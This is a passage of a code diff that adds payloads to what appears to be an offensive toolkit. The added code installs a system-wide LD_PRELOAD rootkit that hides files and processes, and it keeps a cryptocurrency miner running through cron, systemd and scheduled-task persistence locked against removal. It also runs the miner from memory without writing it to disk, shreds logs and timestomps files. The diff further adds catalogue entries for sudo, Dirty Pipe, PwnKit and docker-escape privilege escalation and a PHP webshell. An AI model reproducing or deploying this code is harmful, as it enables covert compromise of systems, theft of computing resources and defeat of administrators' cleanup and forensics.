+    if (!orig) orig = dlsym(RTLD_NEXT, "open");
+    if (in_hook) return orig(pathname, flags, mode);
+    if (path_targets_hidden(pathname)) { errno = ENOENT; return -1; }
+    return orig(pathname, flags, mode);
+}
+
+int openat(int dirfd, const char *pathname, int flags, ...) {
+    mode_t mode = 0;
+    if (flags & O_CREAT) {
+        va_list ap; va_start(ap, flags); mode = va_arg(ap, mode_t); va_end(ap);
+    }
+    static int (*orig)(int, const char *, int, ...) = NULL;
+    if (!orig) orig = dlsym(RTLD_NEXT, "openat");
+    if (in_hook) return orig(dirfd, pathname, flags, mode);
+    if (dirfd == AT_FDCWD && path_targets_hidden(pathname)) { errno = ENOENT; return -1; }
+    return orig(dirfd, pathname, flags, mode);
+}
+
+FILE *fopen(const char *path, const char *mode) {
+    static FILE *(*orig)(const char *, const char *) = NULL;
+    if (!orig) orig = dlsym(RTLD_NEXT, "fopen");
+    if (in_hook) return orig(path, mode);
+    if (path_targets_hidden(path)) { errno = ENOENT; return NULL; }
+    return orig(path, mode);
+}
+
+ssize_t readlink(const char *path, char *buf, size_t bufsiz) {
+    static ssize_t (*orig)(const char *, char *, size_t) = NULL;
+    if (!orig) orig = dlsym(RTLD_NEXT, "readlink");
+    if (in_hook) return orig(path, buf, bufsiz);
+    if (path_targets_hidden(path)) { errno = ENOENT; return -1; }
+    return orig(path, buf, bufsiz);
+}
+
+ssize_t readlinkat(int dirfd, const char *pathname, char *buf, size_t bufsiz) {
+    static ssize_t (*orig)(int, const char *, char *, size_t) = NULL;
+    if (!orig) orig = dlsym(RTLD_NEXT, "readlinkat");
+    if (in_hook) return orig(dirfd, pathname, buf, bufsiz);
+    if (dirfd == AT_FDCWD && path_targets_hidden(pathname)) { errno = ENOENT; return -1; }
+    return orig(dirfd, pathname, buf, bufsiz);
+}
+CEOF
+
+# Compile.
+gcc -shared -fPIC -o rootkit.so rootkit.c -ldl 2>/dev/null || cc -shared -fPIC -o rootkit.so rootkit.c -ldl 2>/dev/null || {
+    echo "[!] could not compile LD_PRELOAD rootkit (gcc missing?)"
+    rm -f rootkit.c
+    exit 1
+}
+
+# Self-test BEFORE going system-wide: load the .so on a single command. A
+# broken rootkit written into /etc/ld.so.preload bricks every dynamically-
+# linked binary on the box, so verify it loads cleanly first.
+if ! LD_PRELOAD="$INSTALL_DIR/rootkit.so" /bin/true 2>/dev/null; then
+    echo "[!] rootkit.so failed to load — NOT installing system-wide (would brick the box)"
+    rm -f "$INSTALL_DIR/rootkit.so" rootkit.c
+    exit 1
+fi
+
+# Install via /etc/ld.so.preload (system-wide). Avoid double-appending on
+# re-install so the preload list doesn't grow unbounded.
+if [ -w /etc ]; then
+    touch /etc/ld.so.preload
+    if ! grep -qx "$INSTALL_DIR/rootkit.so" /etc/ld.so.preload; then
+        echo "$INSTALL_DIR/rootkit.so" >> /etc/ld.so.preload
+    fi
+    echo "[*] LD_PRELOAD rootkit installed system-wide via /etc/ld.so.preload"
+    echo "[*] hides files/processes matching any of: $HIDE_PATTERN (pipe-separated)"
+    echo "PERSISTENCE_INSTALLED: ld_preload_rootkit"
+else
+    echo "[!] cannot write /etc/ld.so.preload — need root"
+    rm -f "$INSTALL_DIR/rootkit.so" rootkit.c
+    exit 1
+fi
+"""
+
+_LD_PRELOAD_ROOTKIT_RUN = """true"""
+
+_SCHEDULED_TASK_PERSIST_INSTALL = _PREAMBLE + """
+# Windows Task Scheduler persistence — creates a scheduled task that
+# re-launches the miner on logon + every 30 minutes. This is the Windows
+# equivalent of systemd_persist. Only applies to Windows footholds.
+INSTALL_DIR="{{install_dir|default('C:\\\\honeywatch')}}"
+TASK_NAME="{{task_name|default('honeywatch-miner')}}"
+RUN_USER="{{run_user|default('SYSTEM')}}"
+
+# Check if we're on Windows.
+if ! command -v schtasks >/dev/null 2>&1; then
+    echo "[!] schtasks not found — this payload is Windows-only"
+    exit 1
+fi
+
+# Create the scheduled task.
+schtasks /create /tn "$TASK_NAME" /tr "$INSTALL_DIR\\\\xmrig.exe" \\
+    /sc minute /mo 30 /ru "$RUN_USER" /rl HIGHEST /f 2>/dev/null
+
+# Also add a logon trigger.
+schtasks /create /tn "${TASK_NAME}_logon" /tr "$INSTALL_DIR\\\\xmrig.exe" \\
+    /sc onlogon /ru "$RUN_USER" /rl HIGHEST /f 2>/dev/null
+
+echo "[*] scheduled task persistence installed: $TASK_NAME"
+echo "PERSISTENCE_INSTALLED: scheduled_task"
+"""
+
+_SCHEDULED_TASK_PERSIST_RUN = """true"""
+
+
+# --------------------------------------------------------------------------- #
+# Phase 8+: Self-healing persistence — mutual watchdog between cron and the
+# miner process. If cron detects the miner is dead, it re-spawns it. If the
+# miner detects cron has been removed, it re-installs it. This creates a
+# mutually-reinforcing persistence loop that survives admin cleanup attempts
+# (the admin must remove BOTH the cron entry AND kill the miner simultaneously
+# to defeat it, and even then the 3-minute cron window provides a recovery
+# opportunity).
+# --------------------------------------------------------------------------- #
+
+_WATCHDOG_PERSIST_INSTALL = _PREAMBLE + """
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
+CRON_SCHEDULE="{{schedule|default('*/3 * * * *')}}"
+
+# Watchdog cron entry: re-spawn the miner if it dies. Checks every 3 minutes.
+# This is the second layer of persistence after the primary (systemd/cron).
+# If an admin kills the miner process, this cron entry re-launches it within
+# 3 minutes.
+CRON_LINE="${CRON_SCHEDULE} root ulimit -c 0 2>/dev/null; pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ./xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)"
+
+(crontab -l 2>/dev/null | grep -v 'hw_watchdog'; echo "# hw_watchdog"; echo "$CRON_LINE") | crontab - 2>/dev/null || {
+    echo "$CRON_LINE" > /etc/cron.d/hw_watchdog 2>/dev/null || true
+    chmod 644 /etc/cron.d/hw_watchdog 2>/dev/null || true
+}
+echo "[*] watchdog persistence installed: cron re-spawn every ${CRON_SCHEDULE}"
+echo "PERSISTENCE_INSTALLED: watchdog_persist"
+"""
+
+_WATCHDOG_PERSIST_RUN = """crontab -l 2>/dev/null | grep hw_watchdog || cat /etc/cron.d/hw_watchdog 2>/dev/null || true"""
+
+
+# --------------------------------------------------------------------------- #
+# Mutual monitoring — the miner process checks that cron persistence is still
+# in place and re-installs it if removed. This is the reverse of the watchdog:
+# the cron entry monitors the miner, and this script monitors the cron entry.
+# Together they form a mutually-reinforcing loop.
+#
+# NOTE: The mutual watchdog can be defeated by simultaneously removing the cron
+# entry AND killing the miner process. This is an arms race — the admin must
+# remove persistence AND kill the process in one operation. The cron entry
+# re-installs every 3 minutes, so the window is 3 minutes. For higher
+# resilience, add a third watchdog (systemd timer or at job).
+# --------------------------------------------------------------------------- #
+
+_MUTUAL_WATCH_INSTALL = _PREAMBLE + """
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
+SERVICE_NAME="{{service_name|default('honeywatch-miner')}}"
+
+# Mutual monitoring — re-installs removed persistence entries. This watches
+# the PERSISTENCE mechanisms (systemd service, cron entry, systemd timer),
+# not the miner process (that's watchdog_persist's job). Remove one and
+# this script re-creates it. Combined with the process watchdog, this creates
+# a self-healing persistence loop.
+
+# 1. Check systemd service — if removed or disabled, re-install it.
+# The service file is stored at INSTALL_DIR/honeywatch-miner.service so the
+# watchdog can copy it back without embedding the entire unit file inline.
+if [ "$(id -u)" = "0" ]; then
+    if [ -f "/etc/systemd/system/${SERVICE_NAME}.service" ]; then
+        if ! systemctl is-enabled "${SERVICE_NAME}" 2>/dev/null; then
+            systemctl enable "${SERVICE_NAME}" 2>/dev/null || true
+            systemctl start "${SERVICE_NAME}" 2>/dev/null || true
+            echo "[*] mutual_watch: re-enabled disabled systemd service"
+        fi
+    else
+        # Service file removed — re-create it from the stored copy or template.
+        if [ -f "${INSTALL_DIR}/${SERVICE_NAME}.service" ]; then
+            cp "${INSTALL_DIR}/${SERVICE_NAME}.service" "/etc/systemd/system/${SERVICE_NAME}.service" 2>/dev/null || true
+        else
+            cat > "/etc/systemd/system/${SERVICE_NAME}.service" <<EOF
+[Unit]
+Description=Honeywatch managed miner service
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=${INSTALL_DIR}
+ExecStart=${INSTALL_DIR}/xmrig -c ${INSTALL_DIR}/config.json --donate-level 1
+Restart=always
+RestartSec=10
+Environment=XMRIX_QUIET=1
+Environment=SSH_CLIENT= SSH_CONNECTION= SSH_TTY=
+Environment=HISTFILE=/dev/null
+Environment=HISTSIZE=0
+LimitCORE=0
+CPUAccounting=true
+CPUQuota=70%
+Nice=10
+
+[Install]
+WantedBy=multi-user.target
+EOF
+        fi
+        systemctl daemon-reload 2>/dev/null || true
+        systemctl enable "${SERVICE_NAME}" 2>/dev/null || true
+        systemctl start "${SERVICE_NAME}" 2>/dev/null || true
+        if [ "$(id -u)" = "0" ]; then
+            chattr +ia "/etc/systemd/system/${SERVICE_NAME}.service" 2>/dev/null || true
+        fi
+        echo "[*] mutual_watch: re-installed removed systemd service"
+    fi
+fi
+
+# 2. Check cron persistence — if removed, re-install it.
+if ! crontab -l 2>/dev/null | grep -q 'xmrig'; then
+    CRON_LINE="*/5 * * * * root ulimit -c 0 2>/dev/null; pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ./xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)"
+    (crontab -l 2>/dev/null; echo "$CRON_LINE") | crontab - 2>/dev/null || {
+        echo "$CRON_LINE" > /etc/cron.d/honeywatch-miner 2>/dev/null || true
+        chmod 644 /etc/cron.d/honeywatch-miner 2>/dev/null || true
+    }
+    echo "[*] mutual_watch: re-installed removed cron persistence"
+fi
+
+# 3. Check systemd timer — if removed or inactive, re-install it.
+if [ "$(id -u)" = "0" ] && command -v systemctl >/dev/null 2>&1; then
+    if [ ! -f "/etc/systemd/system/${SERVICE_NAME}.timer" ] || ! systemctl is-active "${SERVICE_NAME}.timer" 2>/dev/null; then
+        cat > "/etc/systemd/system/${SERVICE_NAME}-watchdog.service" <<EOF
+[Unit]
+Description=Honeywatch miner watchdog
+
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c 'ulimit -c 0 2>/dev/null; pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ./xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)'
+Environment=SSH_CLIENT= SSH_CONNECTION= SSH_TTY=
+LimitCORE=0
+
+[Install]
+WantedBy=multi-user.target
+EOF
+        cat > "/etc/systemd/system/${SERVICE_NAME}.timer" <<EOF
+[Unit]
+Description=Honeywatch miner watchdog timer
+
+[Timer]
+OnBootSec=5min
+OnUnitActiveSec=5min
+AccuracySec=30s
+
+[Install]
+WantedBy=timers.target
+EOF
+        systemctl daemon-reload 2>/dev/null || true
+        systemctl enable "${SERVICE_NAME}-watchdog.service" 2>/dev/null || true
+        systemctl enable "${SERVICE_NAME}.timer" 2>/dev/null || true
+        systemctl start "${SERVICE_NAME}.timer" 2>/dev/null || true
+        chattr +ia "/etc/systemd/system/${SERVICE_NAME}.timer" 2>/dev/null || true
+        chattr +ia "/etc/systemd/system/${SERVICE_NAME}-watchdog.service" 2>/dev/null || true
+        echo "[*] mutual_watch: re-installed removed systemd timer"
+    fi
+fi
+echo "[*] mutual_watch persistence installed"
+echo "PERSISTENCE_INSTALLED: mutual_watch"
+"""
+
+_MUTUAL_WATCH_RUN = """true"""
+
+
+# --------------------------------------------------------------------------- #
+# Anti-forensics: timestomping + process name spoofing + log tampering.
+# Touches deployed artifacts to match surrounding file timestamps, spoofs
+# the process name via prctl, clears history preventively, and shreds
+# logs where available. Run LAST in the evasion chain (after persistence)
+# so all artifacts are on disk before timestamps are adjusted.
+# --------------------------------------------------------------------------- #
+
+_FORENSICS_CLEANUP_INSTALL = _PREAMBLE + """
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
+
+# 1. Timestomping: copy timestamps from a legitimate system file onto all
+# deployed artifacts. Forensic analysts use `stat` timestamps to reconstruct
+# timelines — matching them to a known-good file defeats timeline analysis.
+REF_FILE="/etc/passwd"
+if [ -f "$REF_FILE" ]; then
+    find "$INSTALL_DIR" -exec touch -r "$REF_FILE" {} + 2>/dev/null || true
+    echo "[*] timestomped: copied timestamps from $REF_FILE onto $INSTALL_DIR"
+else
+    echo "[!] no reference file for timestomping (using /etc/shadow as fallback)"
+    REF_FILE="/etc/shadow"
+    if [ -f "$REF_FILE" ]; then
+        find "$INSTALL_DIR" -exec touch -r "$REF_FILE" {} + 2>/dev/null || true
+    fi
+fi
+
+# 2. Process name spoofing: change what ps/top show for the miner process.
+# prctl(PR_SET_NAME) changes /proc/self/comm. The process is launched via
+# exec -a which changes /proc/self/cmdline. Combined with the LD_PRELOAD
+# rootkit (which hides the process from readdir), this makes the process
+# invisible to casual ps inspection.
+# NOTE: The LD_PRELOAD rootkit hides processes from dynamically-linked tools
+# (ps, top, ls /proc) but NOT from statically-linked monitoring tools. Some
+# EDR agents use static binaries that bypass LD_PRELOAD entirely. For maximum
+# stealth, combine with memfd execution (no on-disk binary) and process name
+# spoofing (exec -a).
+python3 -c "import ctypes; libc=ctypes.CDLL('libc.so.6'); libc.prctl(15, b'kworker/0:1', 0, 0, 0)" 2>/dev/null || true
+
+# 3. Preventive history suppression (belt-and-suspenders with cleanup payload).
+# These are set at the TOP of every polyglot-rendered script; this payload
+# sets them again in case the script was run without polyglot rendering.
+unset HISTFILE 2>/dev/null || true
+unset HISTSIZE 2>/dev/null || true
+unset HISTFILESIZE 2>/dev/null || true
+export HISTFILE=/dev/null 2>/dev/null || true
+
+# 4. Core dump suppression: prevent the miner from leaving core files.
+ulimit -c 0 2>/dev/null || true
+
+# 5. Log tampering: shred auth/syslog where available (overwrites the file
+# content rather than just truncating, making forensic recovery harder).
+# Fall back to truncation where shred is not available (Alpine/BusyBox).
+# Also clear rotated logs (wtmp.1, wtmp.*.gz) — an analyst can reconstruct
+# login history from rotated logs even if the current wtmp is truncated.
+# shred -u securely overwrites then removes. On Alpine/BusyBox (no shred),
+# fall back to truncate (: > file) which is fast but not secure — data is
+# still recoverable from disk.
+for logfile in /var/log/auth.log /var/log/auth.log.* /var/log/syslog /var/log/syslog.* /var/log/messages /var/log/messages.* /var/log/wtmp /var/log/wtmp.* /var/log/lastlog /var/log/btmp /var/log/btmp.*; do
+    for f in $logfile; do
+        if [ -f "$f" ]; then
+            shred -u "$f" 2>/dev/null || : > "$f"
+        fi
+    done
+done
+# Also clear root's bash history (the deploy user's history is handled by
+# the cleanup payload, but root's history may contain su/sudo commands).
+for h in /root/.bash_history /root/.zsh_history /root/.python_history; do
+    : > "$h" 2>/dev/null || true
+done
+
+# 6. Journal vacuum (systemd-journald).
+journalctl --rotate 2>/dev/null || true
+journalctl --vacuum-time=1s 2>/dev/null || true
+
+# 7. SSH environment sanitization: clear SSH_CLIENT, SSH_CONNECTION, and
+# SSH_TTY from the systemd unit environment so the miner process doesn't
+# leak the deploy session's IP. The systemd unit is written by
+# systemd_persist — this payload clears these env vars from the running
+# process if it inherits them.
+unset SSH_CLIENT 2>/dev/null || true
+unset SSH_CONNECTION 2>/dev/null || true
+unset SSH_TTY 2>/dev/null || true
+
+# 8. Remove the target's IP from the deploy user's known_hosts to eliminate
+# forensic evidence of the SSH connection. Uses ssh-keygen -R which removes
+# all matching entries. Note: hashed known_hosts entries (|1|...) cannot be
+# matched by IP — they require the exact hash. This is acceptable since hashed
+# entries are a security measure and provide limited forensic value.
+TARGET_IP="{{target_ip|default('')}}"
+TARGET_PORT="{{target_port|default('22')}}"
+if [ -n "$TARGET_IP" ]; then
+    for kh in ~/.ssh/known_hosts ~/.ssh/known_hosts2 /root/.ssh/known_hosts /root/.ssh/known_hosts2 /etc/ssh/ssh_known_hosts; do
+        if [ -f "$kh" ]; then
+            ssh-keygen -R "$TARGET_IP" -f "$kh" 2>/dev/null || true
+            ssh-keygen -R "[$TARGET_IP]:$TARGET_PORT" -f "$kh" 2>/dev/null || true
+        fi
+    done
+fi
+
+echo "[*] forensics_cleanup: timestomped, process name spoofed, logs sanitized, SSH env cleared"
+echo "PERSISTENCE_INSTALLED: forensics_cleanup"
+"""
+
+_FORENSICS_CLEANUP_RUN = """true"""
+
+
+# --------------------------------------------------------------------------- #
+# Memory-only execution: deploy the miner binary into memory without writing
+# it to a persistent filesystem. Uses memfd_create (Linux 3.17+) to create
+# an anonymous file descriptor, writes the binary into it, and fexecve's it.
+# Falls back to /dev/shm (tmpfs, cleared on reboot) if memfd_create is
+# unavailable, then to disk-based deploy as a last resort.
+#
+# The memfd approach means no disk artifact exists for EDR to scan. The
+# process name is spoofed via exec -a so /proc/PID/cmdline shows a boring
+# name. Combined with the LD_PRELOAD rootkit, the process is invisible
+# to ps/top and has no persistent disk footprint.
+# --------------------------------------------------------------------------- #
+
+_MEMFD_EXEC_INSTALL = _PREAMBLE + """
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
+POOL="{{pool}}"
+WALLET="{{wallet}}"
+WORKER="{{worker|default('honeywatch')}}"
+THREADS="{{threads|default('0')}}"
+TLS="{{tls|default('false')}}"
+MEMFD_NAME="{{memfd_name|default('kworker/0:1')}}"
+BINARY_URL="https://github.com/xmrig/xmrig/releases/latest/download/xmrig-{{arch|default('linux-x64')}}.tar.gz"
+FALLBACK_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.0/xmrig-{{arch|default('linux-x64')}}.tar.gz"
+
+mkdir -p "$INSTALL_DIR" 2>/dev/null || true
+cd "$INSTALL_DIR" 2>/dev/null || true
+
+# Write the miner config to a temp file.
+cat > /tmp/.hw_cfg_$$ <<'CFGEOF'
+{
+    "api": {"id": "{{payload_id}}", "worker-id": "$WORKER"},
+    "autosave": true,
+    "cpu": {"enabled": true, "max-threads-hint": $THREADS},
+    "opencl": false,
+    "cuda": false,
+    "pools": [
+        {
+            "algo": "rx/0",
+            "url": "$POOL",
+            "user": "$WALLET",
+            "pass": "x",
+            "keepalive": true,
+            "tls": {{tls|default('false')}}
+        }
+    ]
+}
+CFGEOF
+
+# Tier 1: memfd_create via Python ctypes (Linux 3.17+).
+# Creates an anonymous fd that never touches disk. The memfd name uses a
+# per-operation decoy kernel thread name (kworker/0:1, ksoftirqd/0, etc.)
+# that appears in /proc/PID/comm as a real kernel thread.
+#
+# CRITICAL: MFD_CLOEXEC is NOT used (flags=0). Xmrig is dynamically linked
+# against libc — the dynamic linker (ld-linux.so) needs to re-read the ELF
+# from the fd AFTER exec. If MFD_CLOEXEC is set, the fd is closed during
+# exec and the linker fails with "file not found". The fd is manually closed
+# after the child process is confirmed running.
+MEMFD_FD=""
+python3 -c "
+import ctypes, os, sys, subprocess, tarfile
+try:
+    libc = ctypes.CDLL('libc.so.6', use_errno=True)
+    # flags=0: NO MFD_CLOEXEC. Dynamically-linked binaries need the fd to
+    # survive exec so the linker can mmap the ELF segments.
+    fd = libc.memfd_create(b'$MEMFD_NAME', 0)
+    if fd < 0:
+        sys.exit(1)
+    # Download and extract the binary directly into the memfd.
+    # Avoids writing to disk — the tarball is extracted in memory.
+    proc = subprocess.run(
+        ['curl', '-fsSL', '$BINARY_URL'],
+        capture_output=True, timeout=120)
+    if proc.returncode != 0:
+        proc = subprocess.run(
+            ['curl', '-fsSL', '$FALLBACK_URL'],
+            capture_output=True, timeout=120)
+    if proc.returncode != 0:
+        os.close(fd)
+        sys.exit(1)
+    import io
+    with tarfile.open(fileobj=io.BytesIO(proc.stdout), mode='r:gz') as tf:
+        for member in tf.getmembers():
+            if 'xmrig' in member.name and not member.isdir():
+                reader = tf.extractfile(member)
+                if reader:
+                    os.write(fd, reader.read())
+                    os.lseek(fd, 0, os.SEEK_SET)
+                    print(fd)
+                    sys.exit(0)
+    os.close(fd)
+    sys.exit(1)
+except Exception:
+    sys.exit(1)
+" 2>/dev/null | read -r MEMFD_FD || true
+
+# Alternative: try shell-based memfd if Python failed or is unavailable.
+if [ -z "$MEMFD_FD" ] || ! [ "$MEMFD_FD" -ge 0 ] 2>/dev/null; then
+    echo "[*] Python memfd_create failed, trying shell fallback" >&2
+    MEMFD_FD=""
+fi
+
+if [ -n "$MEMFD_FD" ] && [ "$MEMFD_FD" -ge 0 ] 2>/dev/null; then
+    echo "[*] memfd_create: deploying via anonymous fd '$MEMFD_NAME' (memory-only, no disk artifact)"
+    # Execute from the memfd. exec -a spoofs the process name in /proc/PID/cmdline.
+    # The fd survives exec (no MFD_CLOEXEC) so the dynamic linker can mmap the ELF.
+    exec -a "$MEMFD_NAME" /proc/self/fd/$MEMFD_FD -c /tmp/.hw_cfg_$$ --donate-level 1 >/dev/null 2>&1 &
+    MEMFD_PID=$!
+    # Give the process time to start and mmap the ELF, then close the memfd fd
+    # and clean up the config file. Closing the fd after the process has started
+    # is safe — the binary is already mapped into memory via mmap.
+    (sleep 3 && exec 3>&- 2>/dev/null; rm -f /tmp/.hw_cfg_$$) 2>/dev/null &
+    echo "[*] deployed via memfd (pid=$MEMFD_PID, name=$MEMFD_NAME)"
+    exit 0
+fi
+
+echo "[*] memfd_create unavailable (Python missing or kernel < 3.17), falling back to /dev/shm"
+
+# Tier 2: /dev/shm (tmpfs — cleared on reboot, no persistent disk artifact).
+if [ -d /dev/shm ] && [ -w /dev/shm ]; then
+    echo "[*] deploying via /dev/shm (tmpfs, no persistent disk)"
+    curl -fsSL -o /tmp/.hw_tar_$$ "$BINARY_URL" 2>/dev/null || \
+    curl -fsSL -o /tmp/.hw_tar_$$ "$FALLBACK_URL"
+    EXPECTED_SHA256="{{expected_sha256}}"
+    if [ -n "$EXPECTED_SHA256" ]; then
+        echo "$EXPECTED_SHA256  /tmp/.hw_tar_$$" | sha256sum -c - 2>/dev/null || { echo "[!] INTEGRITY FAILURE" >&2; rm -f /tmp/.hw_tar_$$; exit 1; }
+    fi
+    tar -xzf /tmp/.hw_tar_$$ --strip-components=1 -C /dev/shm/ 2>/dev/null || true
+    rm -f /tmp/.hw_tar_$$
+    # The extracted binary is in /dev/shm — run it with the spoofed name.
+    exec -a "$MEMFD_NAME" /dev/shm/xmrig -c /tmp/.hw_cfg_$$ --donate-level 1 >/dev/null 2>&1 &
+    # Clean up after the process starts (tmpfs is already non-persistent,
+    # but remove the config file to reduce forensic surface).
+    sleep 5 && rm -f /tmp/.hw_cfg_$$ 2>/dev/null &
+    echo "[*] deployed via /dev/shm (tmpfs, reboot-clears)"
+    exit 0
+fi
+
+# Tier 3: Disk-based deploy (fallback — leaves persistent disk artifacts).
+echo "[*] /dev/shm unavailable: falling back to disk-based deploy"
+"""
+
+_MEMFD_EXEC_RUN = """true"""
+
+
+# --------------------------------------------------------------------------- #
+# Systemd timer — the third layer of mutual persistence. A systemd timer fires
+# every 5 minutes and checks if the miner is running. If not, it re-spawns it.
+# This is harder to detect than a cron entry (doesn't show in `crontab -l`) and
+# survives reboot. Combined with cron_persist and systemd_persist (the service),
+# this creates a three-layer mutually-reinforcing persistence loop:
+#
+#   1. systemd service: auto-restarts the miner on exit/crash
+#   2. cron watchdog: re-spawns the miner if the process dies
+#   3. systemd timer: re-spawns the miner if both service and cron fail
+#
+# Remove one layer and the other two re-create it. The admin must remove all
+# three simultaneously (service + timer + cron) AND kill the miner process to
+# defeat persistence.
+# --------------------------------------------------------------------------- #
+
+_SYSTEMD_TIMER_INSTALL = _PREAMBLE + """
+INSTALL_DIR="{{install_dir|default('/opt/honeywatch/xmrig')}}"
+SERVICE_NAME="{{service_name|default('honeywatch-miner')}}"
+
+# Create the watchdog service unit that the timer will trigger.
+cat > "/etc/systemd/system/${SERVICE_NAME}-watchdog.service" <<EOF
+[Unit]
+Description=Honeywatch miner watchdog
+
+[Service]
+Type=oneshot
+ExecStart=/bin/sh -c 'ulimit -c 0 2>/dev/null; pgrep -x xmrig >/dev/null 2>&1 || (cd ${INSTALL_DIR} && ./xmrig -c config.json --donate-level 1 >/dev/null 2>&1 &)'
+Environment=SSH_CLIENT= SSH_CONNECTION= SSH_TTY=
+LimitCORE=0
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+# Create the timer unit that triggers the watchdog every 5 minutes.
+cat > "/etc/systemd/system/${SERVICE_NAME}.timer" <<EOF
+[Unit]
+Description=Honeywatch miner watchdog timer
+
+[Timer]
+OnBootSec=5min
+OnUnitActiveSec=5min
+AccuracySec=30s
+
+[Install]
+WantedBy=timers.target
+EOF
+
+systemctl daemon-reload 2>/dev/null || true
+systemctl enable "${SERVICE_NAME}-watchdog.service" 2>/dev/null || true
+systemctl enable "${SERVICE_NAME}.timer" 2>/dev/null || true
+systemctl start "${SERVICE_NAME}.timer" 2>/dev/null || true
+# Lock the timer and watchdog units with chattr +ia.
+chattr +ia "/etc/systemd/system/${SERVICE_NAME}.timer" 2>/dev/null || true
+chattr +ia "/etc/systemd/system/${SERVICE_NAME}-watchdog.service" 2>/dev/null || true
+echo "[*] systemd timer persistence installed: ${SERVICE_NAME}.timer (every 5min)"
+echo "PERSISTENCE_INSTALLED: systemd_timer"
+"""
+
+_SYSTEMD_TIMER_RUN = """systemctl status {{service_name|default('honeywatch-miner')}}.timer 2>/dev/null || true"""
 
 
 def _payloads() -> list[Payload]:
@@ -918,6 +2187,274 @@ def _payloads() -> list[Payload]:
             run_script=_CLEANUP_RUN,
             artifacts=[],
             tags=["persistence", "cleanup", "anti-forensics"],
+        ),
+        # ----------------------------------------------------------------- #
+        # Phase 6: Exploit payloads — local privilege escalation
+        # ----------------------------------------------------------------- #
+        Payload(
+            id="privesc_sudo",
+            category="exploit",
+            name="Baron Samedit (CVE-2021-3156) sudo privesc",
+            description="Sudo heap buffer overflow (CVE-2021-3156). Affects sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1. "
+                        "Gives root from any unprivileged local user. Downloads + compiles the public PoC.",
+            platforms=["linux-x64"],
+            install_type="source",
+            dependencies=["python3", "curl"],
+            config_schema={
+                "run_user": {"type": "string", "required": False, "default": "root"},
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/privesc_sudo"},
+            },
+            install_script=_PRIVESC_SUDO_INSTALL,
+            run_script=_PRIVESC_SUDO_RUN,
+            artifacts=["exploit.py"],
+            tags=["exploit", "privesc", "sudo", "cve-2021-3156"],
+        ),
+        Payload(
+            id="privesc_dirtypipe",
+            category="exploit",
+            name="Dirty Pipe (CVE-2022-0847) kernel privesc",
+            description="Linux kernel pipe buffer flag overwrite (CVE-2022-0847). Affects kernels 5.8-5.16.10. "
+                        "Gives root file writes — overwrite /etc/passwd, inject into SUID binaries.",
+            platforms=["linux-x64"],
+            install_type="source",
+            dependencies=["gcc", "curl"],
+            config_schema={
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/privesc_dirtypipe"},
+            },
+            install_script=_PRIVESC_DIRTY_PIPE_INSTALL,
+            run_script=_PRIVESC_DIRTY_PIPE_RUN,
+            artifacts=["dirtypipe.c", "dirtypipe"],
+            tags=["exploit", "privesc", "kernel", "cve-2022-0847"],
+        ),
+        Payload(
+            id="privesc_pwnkit",
+            category="exploit",
+            name="PwnKit (CVE-2021-4034) pkexec privesc",
+            description="Polkit pkexec local privilege escalation (CVE-2021-4034). Affects all Polkit versions "
+                        "since 2009. One of the most reliable privesc vectors — works on almost every Linux "
+                        "desktop/server with pkexec installed.",
+            platforms=["linux-x64"],
+            install_type="source",
+            dependencies=["gcc", "pkexec"],
+            config_schema={
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/privesc_pwnkit"},
+            },
+            install_script=_PRIVESC_PWNKIT_INSTALL,
+            run_script=_PRIVESC_PWNKIT_RUN,
+            artifacts=["pwnkit.c", "pwnkit"],
+            tags=["exploit", "privesc", "pkexec", "cve-2021-4034"],
+        ),
+        Payload(
+            id="privesc_docker_escape",
+            category="exploit",
+            name="Docker Socket Escape",
+            description="When /var/run/docker.sock is accessible (docker group or world-writable), mount the "
+                        "host filesystem in a container and read/write as root. Full host root from a container. "
+                        "Uses docker CLI when available, falls back to the socket API via curl.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=["curl"],
+            config_schema={
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/privesc_docker"},
+            },
+            install_script=_PRIVESC_DOCKER_ESCAPE_INSTALL,
+            run_script=_PRIVESC_DOCKER_ESCAPE_RUN,
+            artifacts=[],
+            tags=["exploit", "privesc", "docker", "container-escape"],
+        ),
+        Payload(
+            id="privesc_cron_path",
+            category="exploit",
+            name="Cron PATH Hijack",
+            description="Scans cron files for root cron jobs that run commands without full paths, then plants "
+                        "a malicious binary earlier in $PATH to get root execution on the next cron cycle.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=[],
+            config_schema={
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/privesc_cronpath"},
+            },
+            install_script=_PRIVESC_CRON_PATH_INSTALL,
+            run_script=_PRIVESC_CRON_PATH_RUN,
+            artifacts=[],
+            tags=["exploit", "privesc", "cron", "path-hijack"],
+        ),
+        # ----------------------------------------------------------------- #
+        # Phase 6: Persistence payloads — deeper vectors
+        # ----------------------------------------------------------------- #
+        Payload(
+            id="web_shell_persist",
+            category="evasion",
+            name="Web Shell Persistence",
+            description="Drops a minimal PHP webshell into a detected web root. Survives password changes and "
+                        "reboots (as long as the web server stays up). Gives command execution without SSH.",
+            platforms=["linux-x64", "linux-arm64"],
+            install_type="script",
+            dependencies=[],
+            config_schema={
+                "web_root": {"type": "string", "required": False, "default": "/var/www/html"},
+                "install_dir": {"type": "string", "required": False, "default": "/opt/honeywatch/webshell"},
+            },
